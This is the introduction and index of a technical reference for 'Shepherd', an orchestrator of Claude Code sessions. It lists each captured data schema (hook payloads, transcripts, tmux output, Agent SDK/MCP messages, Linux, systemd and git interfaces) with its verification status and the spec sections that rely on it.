# Shepherd — external data schemas

This is the reference for every real-world data shape Shepherd depends on: hook payloads, transcript files, TUI screens and tmux output, Agent SDK and MCP messages, and Linux, systemd and git interfaces. Every example below was captured from the real system on 2026-09-14. Captures were made on Linux 6.8 with `claude --version` = `2.1.270 (Claude Code)`. The exception is the Agent SDK master runs, which used the CLI bundled in `claude-agent-sdk` 0.2.152 (`2.1.259`); those blocks say so. Each example is copied from a capture file in `docs/probes/2026-09-14-schemas/`, trimmed only where marked `...`. None is typed from memory or copied from the spec. Examples come from throwaway sessions only. The spec (`docs/specs/orchestrator-platform.md`) cites this document for any statement about a real shape. A shape that is not documented here is a gap, not a fact.

## How to read an entry

1. **Produced by / Consumed by / Probe / Status** say who emits the shape, where the spec relies on it (§, spec line, D-number, milestone), how to re-capture it, and how far it was verified.
2. **Real example** is a byte-for-byte excerpt of the named capture file. The field table records presence as always, sometimes or never observed, plus the values actually seen.
3. **Spec alignment** says whether the spec matches reality. Confirmed mismatches are collected in [Spec corrections](#spec-corrections). All paths are relative to the repo root. Paths inside a surface that do not start with `docs/` or `/` are relative to that surface's evidence folder, which is named under its heading.

## Index

Counts: **89** verified live, **38** partially verified, **1** not verifiable here, out of **128** schemas. The last row of the agent-sdk-mcp block re-pins that whole surface at the installed versions (M4 T1, 2026-09-17); read it together with every agent-sdk-mcp entry above it. Consumed-by uses `l.` for spec line numbers.

| Schema | Surface | Status | Consumed by (spec section/D) | Milestone |
|---|---|---|---|---|
| [Hook event names (the enum)](#hook-event-names-the-enum) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §6, l.550, §8, l.912–923, D9, D24 | M1 |
| [Common input fields (every hook's stdin JSON)](#common-input-fields-every-hooks-stdin-json) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.929–931, l.878–887, §7, l.652, 676, D22, D24, D37 | M1 |
| [SessionStart](#sessionstart) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.881, l.922, §9, l.1205, D1, D13, D22 | M1, M3 |
| [SessionEnd](#sessionend) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.887, 918, l.967–970, D24 | M1, M2 |
| [UserPromptSubmit](#userpromptsubmit) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.882, l.922, §7, l.664 | M1 |
| [UserPromptExpansion](#userpromptexpansion) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.882 | — |
| [PreToolUse](#pretooluse) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.916 | M1, M2 |
| [PermissionRequest](#permissionrequest) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.883, l.937, l.917, §7, l.677, §11, l.1684 | M1, M4 |
| [PermissionDenied](#permissiondenied) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.917 | M1 |
| [PostToolUse](#posttooluse) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.916, §18, l.2327 | M1, M2 |
| [PostToolUseFailure](#posttoolusefailure) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.916 | M2 |
| [PostToolBatch](#posttoolbatch) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.912–923 | — |
| [Stop](#stop) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.887, 918, l.962–963, 976, 1025, §9, l.1181, Appendix A, l.2531, D12, D24, D34 | M2, M3 |
| [StopFailure](#stopfailure) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.887, 918, 951–971, §18, l.2330, D21, D24 | M1, M2 |
| [SubagentStart](#subagentstart) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.885, l.919, §7, l.679 | M1 |
| [SubagentStop](#subagentstop) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.885, l.919, §7, l.679 | M1 |
| [TaskCreated / TaskCompleted](#taskcreated--taskcompleted) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.884, §7, l.678, §18, l.2330 | M1, M2 |
| [Notification](#notification) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.883, 917, 937, 945, l.957, §7, l.677, §18, l.2330 | M1, M2 |
| [MessageDisplay](#messagedisplay) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.916 | M1 |
| [PreCompact / PostCompact](#precompact--postcompact) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.921, l.966 | M2 |
| [PreModelSwitch / PostModelSwitch](#premodelswitch--postmodelswitch) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.922, §7 | M1 |
| [InstructionsLoaded](#instructionsloaded) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | not consumed by the spec | — |
| [ConfigChange](#configchange) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §15 | — |
| [CwdChanged](#cwdchanged) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | §8, l.922, D22 | M1 |
| [FileChanged](#filechanged) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.886, l.923, §7, l.680, D22, §18, l.2330 | M1 |
| [DirectoryAdded](#directoryadded) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | D22 | — |
| [Elicitation / ElicitationResult](#elicitation--elicitationresult) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.917 | M1 |
| [Setup](#setup) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | verified | not consumed by the spec | — |
| [WorktreeCreate / WorktreeRemove](#worktreecreate--worktreeremove) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | D15 | — |
| [TeammateIdle](#teammateidle) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | not verifiable | not consumed by the spec | — |
| [Enumerations (SessionStart.source, SessionEnd.reason, StopFailure.error, Notification.notification_type)](#enumerations-sessionstartsource-sessionendreason-stopfailureerror-notificationnotification_type) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.937, 951–971, 1205, D21 | M2 |
| [Hooks config schema (`hooks` in settings.json)](#hooks-config-schema-hooks-in-settingsjson) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.893–907, §15, l.2230–2233, §6, principle 4 | M1, M6 |
| [Hook runtime contract (process, stdin, env, exit codes, stdout, timeout, sync, ancestry)](#hook-runtime-contract-process-stdin-env-exit-codes-stdout-timeout-sync-ancestry) | [hooks](#claude-code-hooks-headless--p-plus-one-tui-run--schemas-observed-2026-09-14) | partial | §8, l.895–909, §5.0, l.312, principle 4, l.163, D37, §18 | M1 |
| [Project directory layout (`~/.claude/projects/<slug>/`)](#project-directory-layout-claudeprojectsslug) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §6, l.436, l.549, §7, l.609, §12, l.1870, D24 | M1 |
| [Project directory slug rule](#project-directory-slug-rule) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §6, l.436, D22 | M1 |
| [Transcript entry: common envelope](#transcript-entry-common-envelope) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §6, l.437, §8, l.1022, D24 | M1, M2 |
| [Transcript entry: `assistant`](#transcript-entry-assistant) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | partial | §7, l.666, §8, §12, D24 | M1, M2 |
| [Transcript entry: `<synthetic>` assistant](#transcript-entry-synthetic-assistant) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §8, §7, D24 | M2 |
| [Transcript entry: `user`](#transcript-entry-user) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §7, l.664, §8 | M1, M2 |
| [Transcript entry: `attachment`](#transcript-entry-attachment) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | partial | §8, l.1022 | M2 |
| [Transcript entry: `system` (stop_hook_summary, turn_duration, others)](#transcript-entry-system-stop_hook_summary-turn_duration-others) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | partial | §8 | M2 |
| [Compaction entries (`system/compact_boundary` + compact summary `user`)](#compaction-entries-systemcompact_boundary--compact-summary-user) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §8, l.966 | M2 |
| [Title and name entries: `ai-title`, `custom-title`, `agent-name` (title sources)](#title-and-name-entries-ai-title-custom-title-agent-name-title-sources) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §7.1, l.700–736, D29, §18 | M1, M3 |
| [`last-prompt` entry](#last-prompt-entry) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §7, l.664, Appendix A, l.2446 | M1 |
| [`queue-operation` and task-notification entries](#queue-operation-and-task-notification-entries) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §12, l.1870, §8 | M1 |
| [Subagent transcript and `.meta.json` (Agent tool)](#subagent-transcript-and-metajson-agent-tool) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §7, l.609, §12, l.1870, §11 | M1 |
| [Workflow subagents: `journal.jsonl`, `workflows/wf_<runId>.json`, script](#workflow-subagents-journaljsonl-workflowswf_runidjson-script) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §12, l.1870, §7, l.609 | M1 |
| [Other metadata entries (`mode`, `permission-mode`, `atis-latch`, `bridge-session`, `cost-state`, `file-history-*`, `frame-link`, `artifact-*`, `pr-link`)](#other-metadata-entries-mode-permission-mode-atis-latch-bridge-session-cost-state-file-history--frame-link-artifact--pr-link) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | partial | §7, l.681, §8 | M1, M2 |
| [Resume (`--resume <id>`)](#resume---resume-id) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §6, l.548, D10, D30 | M3, M4 |
| [Fork (`--resume <id> --fork-session`) — the basis of `ask()`](#fork---resume-id---fork-session--the-basis-of-ask) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §9, l.1197–1217, D13, l.495, l.551, §18, l.2326 | M3 |
| [`~/.claude.json` — `projects[<cwd>]` (trust and last-session fields)](#claudejson--projectscwd-trust-and-last-session-fields) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | verified | §13, §8, l.926 | M1 |
| [Live-session registry `~/.claude/sessions/<pid>.json`](#live-session-registry-claudesessionspidjson) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | partial | §8, l.926–927, D1, §12 | M1 |
| [`claude agents --json`](#claude-agents---json) | [transcripts](#claude-code-transcripts-and-on-disk-session-state) | partial | §8, l.926, D1 | M1 |
| [Workspace-trust dialog (TUI, tmux capture-pane)](#workspace-trust-dialog-tui-tmux-capture-pane) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, D14, §8, l.940 | M3, M5 |
| [Hook event parity: interactive TUI versus headless `-p`](#hook-event-parity-interactive-tui-versus-headless--p) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | partial | §8, l.877–889, l.935–970, §9, l.1181, D12, D24 | M1, M3 |
| [Notification payload (TUI: idle_prompt, permission_prompt)](#notification-payload-tui-idle_prompt-permission_prompt) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | partial | §8, l.883, 937, 945–947, §12 | M1, M2 |
| [PermissionRequest payload (TUI, waiting for a human)](#permissionrequest-payload-tui-waiting-for-a-human) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §8, l.883, 937, §11, l.1684 | M1, M3 |
| [SessionEnd payload (TUI: /exit, tmux kill-session, SIGTERM)](#sessionend-payload-tui-exit-tmux-kill-session-sigterm) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | partial | §8, l.887, 938, 964–970 | M2, M3 |
| [SessionStart payload (TUI: startup, compact, fork, named spawn)](#sessionstart-payload-tui-startup-compact-fork-named-spawn) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | partial | §8, l.881, 925–927, §9, l.1203–1205, D13, §7, l.652, §7.1, D29 | M1, M3 |
| [PreCompact / PostCompact payload (manual /compact typed into the TUI)](#precompact--postcompact-payload-manual-compact-typed-into-the-tui) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | partial | §8, l.921, l.966 | M2 |
| [UserPromptSubmit from tmux send-keys](#userpromptsubmit-from-tmux-send-keys) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §8, l.882, §9, l.1163–1177, l.1179–1185, D12 | M3 |
| [tmux send-keys delivery hazards (programmatic write path)](#tmux-send-keys-delivery-hazards-programmatic-write-path) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, l.1165–1169, §9.5, l.1229, D12, D40 | M3 |
| [Transcript entries written by TUI input: queue-operation, queued_command, compact_boundary](#transcript-entries-written-by-tui-input-queue-operation-queued_command-compact_boundary) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, D12, §8, D24 | M2, M3 |
| [Session title: /rename and --name (custom-title, agent-name, session_title, pane_title)](#session-title-rename-and---name-custom-title-agent-name-session_title-pane_title) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §7.1, l.700–736, D29, l.134, l.496, l.438, §18, l.2331 | M3 |
| [Session sidecar file ~/.claude/sessions/<pid>.json](#session-sidecar-file-claudesessionspidjson) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §8, l.933–945, §9, §7.1 | M1, M3 |
| [tmux list-sessions -F pane state (remain-on-exit on)](#tmux-list-sessions--f-pane-state-remain-on-exit-on) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, D14, §7, l.693, l.964 | M3 |
| [tmux capture-pane output (-p, -e, -S -2000) for the Claude Code TUI](#tmux-capture-pane-output--p--e--s--2000-for-the-claude-code-tui) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, l.1140, 1147–1160, l.426, D14 | M3 |
| [tmux pipe-pane live byte stream](#tmux-pipe-pane-live-byte-stream) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, l.1152, l.425 | M3 |
| [tmux resize-window reflow](#tmux-resize-window-reflow) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, l.1142, l.428, D14 | M3 |
| [ask() via fork: claude --resume <id> --fork-session in a second tmux session](#ask-via-fork-claude---resume-id---fork-session-in-a-second-tmux-session) | [tmux-tui](#surface-interactive-claude-code-tui-under-tmux) | verified | §9, l.1197–1216, D13, l.116, l.495, §7, l.657–659, §18, l.2326 | M3 |
| [Agent SDK package and its bundled CLI](#agent-sdk-package-and-its-bundled-cli) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §5, l.406, §6, §11, §15, D10, D30 | M4 |
| [`ClaudeAgentOptions` (as installed)](#claudeagentoptions-as-installed) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11, l.1525–1537, §6, D10, D19, D20, D30, D32 | M4 |
| [Control protocol handshake (SDK ↔ CLI over stdio)](#control-protocol-handshake-sdk--cli-over-stdio) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §6, §11, D30, D32 | M4 |
| [`system/init` message (`SystemMessage(subtype="init")`)](#systeminit-message-systemmessagesubtypeinit) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §6, §11, §18, D10, D20, D30 | M4 |
| [`AssistantMessage` and its content blocks](#assistantmessage-and-its-content-blocks) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §6, §12, D30 | M4 |
| [`UserMessage` carrying tool results](#usermessage-carrying-tool-results) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §6, §11, l.1722, l.1743, D8, D32 | M4 |
| [`ResultMessage` (end of turn)](#resultmessage-end-of-turn) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | partial | §6, D31, §12, D30 | M4 |
| [Other stream objects: `rate_limit_event`, `system/status`, `system/thinking_tokens`, `stream_event`](#other-stream-objects-rate_limit_event-systemstatus-systemthinking_tokens-stream_event) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §6, §17 | M4 |
| [In-process MCP tool declaration (`@tool` + `create_sdk_mcp_server`) and the wire shape it produces](#in-process-mcp-tool-declaration-tool--create_sdk_mcp_server-and-the-wire-shape-it-produces) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11.0, l.1479, l.1455, §11, l.1532, D32 | M4 |
| [In-process MCP `tools/call`: what the handler receives, returns, and how errors look](#in-process-mcp-toolscall-what-the-handler-receives-returns-and-how-errors-look) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11.0, l.1464, l.1722, D32 | M4 |
| [`can_use_tool` permission callback (control request, callback input, allow and deny)](#can_use_tool-permission-callback-control-request-callback-input-allow-and-deny) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11, l.1534, l.1725–1751, D8, D10 | M4 |
| [Built-in tools reachable from the spec-configured master](#built-in-tools-reachable-from-the-spec-configured-master) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11, l.1542, D10, D19, l.2193 | M4 |
| [Python hook callbacks inside the SDK master (`hooks=` → `hook_callback`)](#python-hook-callbacks-inside-the-sdk-master-hooks--hook_callback) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11, l.1725–1751 | M4 |
| [`interrupt()`: request, receipt, and what the turn looks like afterwards](#interrupt-request-receipt-and-what-the-turn-looks-like-afterwards) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | partial | §6, l.448, §11, l.1747, D31 | M4 |
| [`resume` and `fork_session`: session identity and transcript location](#resume-and-fork_session-session-identity-and-transcript-location) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §6, l.447, l.524–534, §11, l.1535, §9, D13, D30 | M3, M4 |
| [`setting_sources` isolation: what actually reaches the master](#setting_sources-isolation-what-actually-reaches-the-master) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | partial | §11, l.1528, §14, l.2193–2195, §18, l.2329, D10, D19 | M4 |
| [Tier-2 stdio MCP: server process launch and environment](#tier-2-stdio-mcp-server-process-launch-and-environment) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11.0, l.1480, §11, l.1695, l.1619, D20, D32 | M4 |
| [Tier-2 stdio MCP: `initialize` and `tools/list` (JSON-RPC as Claude Code speaks it)](#tier-2-stdio-mcp-initialize-and-toolslist-json-rpc-as-claude-code-speaks-it) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11.0, l.1480, l.1432, D32 | M4 |
| [Tier-2 stdio MCP: `tools/call` requests, results, errors, and what the model sees](#tier-2-stdio-mcp-toolscall-requests-results-errors-and-what-the-model-sees) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §11.0, §11, l.1722, l.1701–1706, D32 | M4 |
| [MCP tools in shell-hook payloads (tier-2 session)](#mcp-tools-in-shell-hook-payloads-tier-2-session) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §8, §11, l.1684, D24 | M1, M4 |
| [Agent SDK re-pin at claude-agent-sdk 0.2.153 / Claude Code 2.1.273 and 2.1.274 (M4 T1 / P1–P4, 2026-09-17)](#agent-sdk-re-pin-at-claude-agent-sdk-02153--claude-code-21273-and-21274-m4-t1--p1p4-2026-09-17) | [agent-sdk-mcp](#claude-agent-sdk-the-master-m4-and-mcp-the-tier-2-tool-surface-m4-schemas-observed-2026-09-14) | verified | §6, §11, l.1528, §14, l.2193–2195, §18, l.2329, D10, D19, D30, D42, D54 | M4 |
| [`/proc/<pid>/stat` of a claude process (starttime, comm, ppid)](#procpidstat-of-a-claude-process-starttime-comm-ppid) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §5, §8, l.938, l.964, §9, D1, D14 | M1, M3 |
| [`/proc/<pid>/{cmdline,exe,cwd,environ,cgroup}` of a claude process](#procpidcmdlineexecwdenvironcgroup-of-a-claude-process) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §8, l.881, 926–927, §7.0, D1, D22 | M1 |
| [Hook process ancestry and environment (which claude owns this hook?)](#hook-process-ancestry-and-environment-which-claude-owns-this-hook) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §8, l.893–930, §5, l.312, D37 | M1 |
| [pid ↔ session_id linkage: `~/.claude/sessions/<pid>.json` `procStart` = `/proc/<pid>/stat` field 22](#pid--session_id-linkage-claudesessionspidjson-procstart--procpidstat-field-22) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §8, l.881 and 926–927, D1, D24 | M1 |
| [Unix domain socket at mode 0600 + `SO_PEERCRED`](#unix-domain-socket-at-mode-0600--so_peercred) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §5, l.312, §13, l.2044, §15, l.2219, D37 | M1 |
| [systemd user manager, transient unit `Restart=always`, and journal lines](#systemd-user-manager-transient-unit-restartalways-and-journal-lines) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §15, l.2209–2226, D39, §7, l.860 | M1, M2, M3, M4, M6 |
| [`loginctl show-user` (Linger)](#loginctl-show-user-linger) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §15, l.2221–2226, D39, principle 4 | — |
| [XDG base directories (this shell vs systemd user manager)](#xdg-base-directories-this-shell-vs-systemd-user-manager) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §15, l.2213–2219, §7, l.830, §13, l.2049, D39 | M1 |
| [Credential store availability (Secret Service vs 0600 file)](#credential-store-availability-secret-service-vs-0600-file) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | partial | §13, l.2049, D2, D39 | M4, M4.5 |
| [Runtime toolchain (Python, SQLite, venv/pip, Node/TypeScript)](#runtime-toolchain-python-sqlite-venvpip-nodetypescript) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §5, l.404–411, principle 6, l.168, §7, l.570, §15, l.2209, D26 | M1, M2, M3, M4 |
| [`git rev-parse` outputs for cwd → repo binding](#git-rev-parse-outputs-for-cwd--repo-binding) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §7, l.632, l.621, §8, l.881, §13, l.2113, D22 | M1 |
| [`git remote get-url` forms (`repo.vcs_remote`)](#git-remote-get-url-forms-repovcs_remote) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | §7, l.633, Appendix A, l.2408, §13, l.2052–2053, D22 | M1 |
| [`git worktree list --porcelain` and a linked worktree's `.git` file](#git-worktree-list---porcelain-and-a-linked-worktrees-git-file) | [linux-process-git](#linux-processes-sockets-systemd-xdg-credentials-toolchain-and-git) | verified | D22, D15, §10, l.1374, §11, l.1631, §7, l.665 | M1, M5 |
| [tmux server cgroup under a systemd user unit (`sessiond` stand-in)](#tmux-server-cgroup-under-a-systemd-user-unit-sessiond-stand-in) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | D14, l.117, §9, l.1139, D39, §15, l.2209-2219 | M3 |
| [systemd user-manager environment: PATH, `claude` resolution and auth inside a unit; env handed to panes](#systemd-user-manager-environment-path-claude-resolution-and-auth-inside-a-unit-env-handed-to-panes) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | D39, l.143, §15, l.2209-2219, l.547, §9 | M3 |
| [Pane environment source: tmux server environment versus the calling client (`new-session -e`)](#pane-environment-source-tmux-server-environment-versus-the-calling-client-new-session--e) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | §9, l.424, D11 | M3 |
| [tmux session-name rewriting and `-t` target resolution](#tmux-session-name-rewriting-and--t-target-resolution) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | §18, l.2344-2358, §9, l.1135 | M3 |
| [`$TMUX` inheritance inside a pane](#tmux-inheritance-inside-a-pane) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | §18, l.2349-2351 | M3 |
| [Second tmux client attaching to a session that `Runner.resize` sized](#second-tmux-client-attaching-to-a-session-that-runnerresize-sized) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | D14, l.117, §9, l.1141, l.1991, l.428 | M3 |
| [Raw key bytes delivered to a pane through tmux](#raw-key-bytes-delivered-to-a-pane-through-tmux) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | §9, l.1150-1153, l.1171-1173, l.427, D40 | M3 |
| [Key semantics in the Claude Code TUI (history, bracketed paste, Ctrl-C, Esc)](#key-semantics-in-the-claude-code-tui-history-bracketed-paste-ctrl-c-esc) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | §9, l.1171-1173, D40, l.1975 | M3 |
| [Interrupting a running TUI turn: Esc, C-c, SIGINT](#interrupting-a-running-tui-turn-esc-c-c-sigint) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.1169, l.1231, l.1975, l.429, l.965, l.1181 | M3, M4 |
| [Brief passed as argv through `tmux new-session` (`EngineAdapter.spawn_argv`)](#brief-passed-as-argv-through-tmux-new-session-engineadapterspawn_argv) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.435, l.1377, l.2112 | M3, M5 |
| [`--effort` flag: accepted values, invalid values, what reaches the API](#--effort-flag-accepted-values-invalid-values-what-reaches-the-api) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.552, l.454, l.498, l.1656 | M3, M4 |
| [`ModelProvider.models()` source: initialize `models[]`](#modelprovidermodels-source-initialize-models) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.453, l.2287 | M4 |
| [Transcript JSONL: append-only and whole-line writes](#transcript-jsonl-append-only-and-whole-line-writes) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | partial | l.437, D24 | M2 |
| [Hooks written into a running session (attached-session registration)](#hooks-written-into-a-running-session-attached-session-registration) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.925-927, l.881, l.440 | M1 |
| [User-scope hooks with `_shepherd_managed`, and the same command in two scopes](#user-scope-hooks-with-_shepherd_managed-and-the-same-command-in-two-scopes) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | §15, l.2230-2233, l.440-441 | M1 |
| [Tier-2 MCP server at user scope: `claude mcp add -s user`, pickup, permission rules](#tier-2-mcp-server-at-user-scope-claude-mcp-add--s-user-pickup-permission-rules) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.1431-1433, l.1540 | M4 |
| [Observed process exit for a process Shepherd did not spawn (pidfd)](#observed-process-exit-for-a-process-shepherd-did-not-spawn-pidfd) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.938, l.964, l.430, l.693 | M2, M3 |
